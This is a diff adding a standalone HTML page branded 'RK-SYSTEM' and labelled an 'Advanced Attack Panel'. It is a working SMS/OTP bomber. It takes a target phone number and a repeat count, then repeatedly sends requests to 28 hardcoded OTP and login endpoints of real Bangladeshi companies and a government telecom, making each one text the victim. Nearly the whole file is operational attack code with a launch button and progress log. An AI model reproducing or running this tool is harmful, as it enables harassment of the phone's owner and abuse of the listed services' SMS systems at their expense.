@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ RK-SYSTEM | PREMIUN SMS SENDER</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #00f2fe;
+            --accent: #ff00ff;
+            --bg-dark: #080a10;
+        }
+        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Rajdhani', sans-serif; }
+        body { background: var(--bg-dark); height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; overflow: hidden; }
+        .monitor { width: 95%; max-width: 450px; background: rgba(15, 25, 35, 0.9); border: 2px solid var(--primary); border-radius: 20px; padding: 25px; box-shadow: 0 0 30px rgba(0, 242, 254, 0.3); backdrop-filter: blur(10px); position: relative; }
+        h2 { font-family: 'Orbitron', sans-serif; text-align: center; color: var(--primary); letter-spacing: 3px; margin-bottom: 5px; text-shadow: 0 0 10px var(--primary); }
+        .brand { text-align: center; font-size: 10px; color: var(--accent); letter-spacing: 5px; margin-bottom: 20px; text-transform: uppercase; font-weight: bold; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px solid rgba(0, 242, 254, 0.3); border-radius: 8px; color: #fff; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--primary); box-shadow: 0 0 10px var(--primary); }
+        .btn-box { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        button { padding: 12px; border: none; border-radius: 8px; cursor: pointer; font-family: 'Orbitron', sans-serif; font-weight: bold; transition: 0.3s; text-transform: uppercase; }
+        .btn-run { background: var(--primary); color: #000; grid-column: span 2; }
+        .btn-pause { background: #f1c40f; color: #000; display: none; }
+        .btn-stop { background: #e74c3c; color: #fff; display: none; }
+        .status-box { margin-top: 20px; display: none; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 10px; }
+        .progress-bg { width: 100%; height: 8px; background: #222; border-radius: 5px; margin: 10px 0; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, var(--primary), var(--accent)); transition: 0.2s; }
+        .logs { height: 80px; background: #000; margin-top: 10px; padding: 10px; font-size: 11px; overflow-y: auto; color: #0f0; border: 1px solid rgba(255,255,255,0.1); border-radius: 5px; }
+    </style>
+</head>
+<body>
+
+<div class="monitor">
+    <h2>RK-SYSTEM</h2>
+    <div class="brand">Advanced Attack Panel</div>
+
+    <input type="text" id="target" placeholder="TARGET NUMBER (01XXXXXXXXX)">
+    <input type="number" id="count" placeholder="ATTACK LIMIT (e.g. 50)">
+
+    <div class="btn-box">
+        <button id="runBtn" class="btn-run" onclick="start()">🚀 Launch Attack</button>
+        <button id="pauseBtn" class="btn-pause" onclick="togglePause()">Pause</button>
+        <button id="stopBtn" class="btn-stop" onclick="stop()">Stop</button>
+    </div>
+
+    <div class="status-box" id="statBox">
+        <div style="display:flex; justify-content: space-between; font-size: 12px;">
+            <span id="pText">Progress: 0%</span>
+            <span id="timer">0.0s</span>
+        </div>
+        <div class="progress-bg"><div class="progress-fill" id="pFill"></div></div>
+        <div style="font-size: 12px; text-align: center;">
+            ✅ <span id="sVal">0</span> | ❌ <span id="fVal">0</span>
+        </div>
+        <div class="logs" id="logArea">System Ready...</div>
+    </div>
+</div>
+
+<script>
+// --- API configuration ---
+const APIs = [
+  { name: "Shadhin Music", url: "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq", method: "POST", body: (p) => ({msisdn: "880"+p.replace(/^0/,""), shortcode:16235, servicename:"Shadhin Music"}) },
+  { name: "Khaodao", url: "https://api.eat-z.com/auth/customer/app-connect", method: "POST", body: (p) => ({username: "+88"+p.replace(/^0/,"")}) },
+  { name: "Walton", url: "https://waltonplaza.com.bd/api/auth/otp/create", method: "POST", body: (p) => ({auth: {countryCode:"880", phone:p.replace(/^0/,"")}, captchaToken:"recapcha"}) },
+  { name: "Apex4u", url: "https://api.apex4u.com/api/auth/login", method: "POST", body: (p) => ({phoneNumber: p}) },
+  { name: "Easy.com", url: "https://core.easy.com.bd/api/v1/forgot-password-otp", method: "POST", body: (p) => ({mobile: p}) },
+  { name: "Bikroy", url: (p) => `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${p}`, method: "GET" },
+  { name: "Chardike", url: "https://api.chardike.com/api/otp/send", method: "POST", body: (p) => ({phone: p, otp_type: "login"}) },
+  { name: "BTCL", url: "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", method: "POST", body: (p) => ({phoneNbr: p, OTPType: 1.0}) },
+  { name: "AWS POC", url: "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send", method: "POST", body: (p) => ({phone: p}) },
+  { name: "Otithee", url: "https://gateway.otithee.com/api/v1/generate-otp", method: "POST", body: (p) => ({request_type: "registration", mobile_number: p}) },
+  { name: "Quizgiri", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", method: "POST", body: (p) => ({country_code: "+88", phone: p}) },
+  { name: "Mojaru", url: "https://new.mojaru.com/api/student/login", method: "POST", body: (p) => ({mobile_or_email: p}) },
+  { name: "MyGP", url: "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp", method: "POST", body: (p) => ({mobileNumber: p}) },
+  { name: "Garibook", url: "https://api.garibookadmin.com/api/v3/user/login", method: "POST", body: (p) => ({mobile: p, channel: "web"}) },
+  { name: "Bioscope", url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web", method: "POST", body: (p) => ({number: "+88"+p.replace(/^0/,"")}) },
+  { name: "Matrimony", url: (p) => `https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo=${p}`, method: "GET" },
+  { name: "Upay", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", method: "POST", body: (p) => ({wallet_number: p}) },
+  { name: "Chorki", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD", method: "POST", body: (p) => ({number: "+88"+p.replace(/^0/,"")}) },
+  { name: "Deepto Play", url: "https://api.deeptoplay.com/v2/auth/login?country=BD", method: "POST", body: (p) => ({number: "+88"+p.replace(/^0/,"")}) },
+  { name: "RedX", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", method: "POST", body: (p) => ({phoneNumber: p}) },
+  { name: "Bohubrihi", url: "https://bb-api.bohubrihi.com/public/activity/otp", method: "POST", body: (p) => ({phone: p, intent: "login"}) },
+  { name: "Timezone", url: "https://backend.timezonebd.com/api/v1/user/otp-login", method: "POST", body: (p) => ({phone: p}) },
+  { name: "GP Shop", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", method: "POST", body: (p) => ({phone: p}) },
+  { name: "Shikho", url: "https://api.shikho.com/public/activity/otp", method: "POST", body: (p) => ({phone: p, intent: "ap-discount-request"}) },
+  { name: "Edge Course", url: "https://edgecoursebd.com/register", method: "POST", body: (p) => ({phone: p}) },
+  { name: "Ghoori", url: "https://api.ghoorilearning.com/api/auth/signup/otp", method: "POST", body: (p) => ({mobile_no: p}) },
+  { name: "Ostad", url: "https://api.ostad.app/api/v2/user/with-otp", method: "POST", body: (p) => ({msisdn: p}) },
+  { name: "iEducation", url: "https://www.ieducationbd.com/api/account/check_user", method: "POST", body: (p) => ({mobile: p}) }
+];
+
+let active = false, paused = false, s = 0, f = 0, curr = 0, total = 0, time;
+
+function log(msg) {
+    const l = document.getElementById('logArea');
+    l.innerHTML = `> ${msg}<br>${l.innerHTML}`;
+}
+
+async function start() {
+    const p = document.getElementById('target').value;
+    const c = parseInt(document.getElementById('count').value);
+    if(p.length < 11 || !c) return alert("Error: Input Invalid!");
+
+    active = true; paused = false; s = 0; f = 0; curr = 0;
+    total = c * APIs.length; time = Date.now();
+
+    document.getElementById('statBox').style.display = "block";
+    document.getElementById('runBtn').style.display = "none";
+    document.getElementById('pauseBtn').style.display = "block";
+    document.getElementById('stopBtn').style.display = "block";
+
+    for(let i=0; i<c; i++) {
+        for(let api of APIs) {
+            if(!active) return;
+            while(paused) await new Promise(r => setTimeout(r, 500));
+
+            try {
+                const url = typeof api.url === "function" ? api.url(p) : api.url;
+                const opt = { method: api.method, mode: 'no-cors' };
+                if(api.method === "POST") {
+                    opt.headers = {"Content-Type":"application/json"};
+                    opt.body = JSON.stringify(api.body(p));
+                }
+                fetch(url, opt);
+                s++; log(`RK-SYSTEM :: ${api.name} -> OK`);
+            } catch(e) {
+                f++; log(`RK-SYSTEM :: ${api.name} -> ERR`);
+            }
+            curr++; updateUI();
+            await new Promise(r => setTimeout(r, 250));
+        }
+    }
+    stop("Attack Finished!");
+}
+
+function updateUI() {
+    const pc = (curr/total)*100;
+    document.getElementById('pFill').style.width = pc + "%";
+    document.getElementById('pText').innerText = `Progress: ${Math.round(pc)}%`;
+    document.getElementById('sVal').innerText = s;
+    document.getElementById('fVal').innerText = f;
+    document.getElementById('timer').innerText = ((Date.now()-time)/1000).toFixed(1) + "s";
+}
+
+function togglePause() {
+    paused = !paused;
+    document.getElementById('pauseBtn').innerText = paused ? "Resume" : "Pause";
+    log(paused ? "SYSTEM PAUSED" : "SYSTEM RESUMED");
+}
+
+function stop(m = "Attack Stopped") {
+    active = false;
+    document.getElementById('runBtn').style.display = "block";
+    document.getElementById('pauseBtn').style.display = "none";
+    document.getElementById('stopBtn').style.display = "none";
+    log(m);
+}
+</script>
+</body>
+</html>
